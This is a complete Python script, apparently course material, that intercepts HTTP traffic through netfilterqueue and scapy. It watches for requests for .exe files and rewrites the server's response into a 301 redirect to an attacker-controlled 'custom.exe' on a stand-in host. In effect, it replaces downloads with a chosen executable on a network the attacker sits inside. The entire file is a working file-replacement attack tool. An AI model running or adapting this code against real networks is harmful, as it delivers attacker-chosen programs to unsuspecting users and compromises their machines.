#!/usr/bin/env python

# this will only work for normal HTTP and not HTTPS

import netfilterqueue
import scapy.all as scapy


ack_list = []
hackers_server_address = "example.org"


def set_load(packet, load):
    # using HTTP 301 to redirect to simple download link.
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 10000:
            # print("HTTP Request")
            # remember all other file extensions such as pdf, docx
            if ".exe" in scapy_packet[scapy.Raw].load and hackers_server_address not in scapy_packet[scapy.Raw].load:
                print("[+] Found exe in request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].dport == 10000:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print("[+] Old payload")
                print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://" + hackers_server_address + "/custom.exe\n\n")
                print("[+] New payload")
                print(modified_packet.show())
                packet.set_payload(str(modified_packet))

    packet.accept()


# will cut traffic
# packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()